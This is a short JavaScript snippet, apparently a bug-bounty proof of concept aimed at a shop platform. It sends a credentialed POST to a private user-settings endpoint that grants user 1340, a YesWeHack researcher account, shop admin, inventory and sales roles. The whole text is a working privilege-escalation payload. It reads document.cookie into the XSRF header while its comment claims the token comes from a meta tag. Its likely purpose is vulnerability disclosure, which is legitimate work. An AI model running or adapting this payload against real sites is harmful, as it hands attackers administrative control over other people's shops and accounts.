// Example fetch using a token provided by the server in a meta tag
const token = document.cookie;

fetch('/mmp/private/shop/setting/user/1340', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Xsrf-Token': token,
    'X-Requested-With': 'XMLHttpRequest'
  },
  credentials: 'include', // if you need to include cookies for same-origin requests
  body: JSON.stringify({
    id: 1340,
    username: 'hack3r_0-ywh-f5d88fb047e36f02@yeswehack.ninja',
    roles: [ {"enabled":true,"role":"GROUP_SHOP_ADMIN"},{"enabled":true,"role":"GROUP_SHOP_INVENTORY"},{"enabled":true,"role":"GROUP_SHOP_SALES"},{"enabled":false,"role":"GROUP_SHOP_ACCOUNTANCY"},{"enabled":false,"role":"GROUP_SHOP_SUPPORT"} ]
  })
}).then(r => {
  if (!r.ok) throw new Error('Request failed: ' + r.status);
  return r.json();
}).then(data => console.log('OK', data))
  .catch(err => console.error(err));
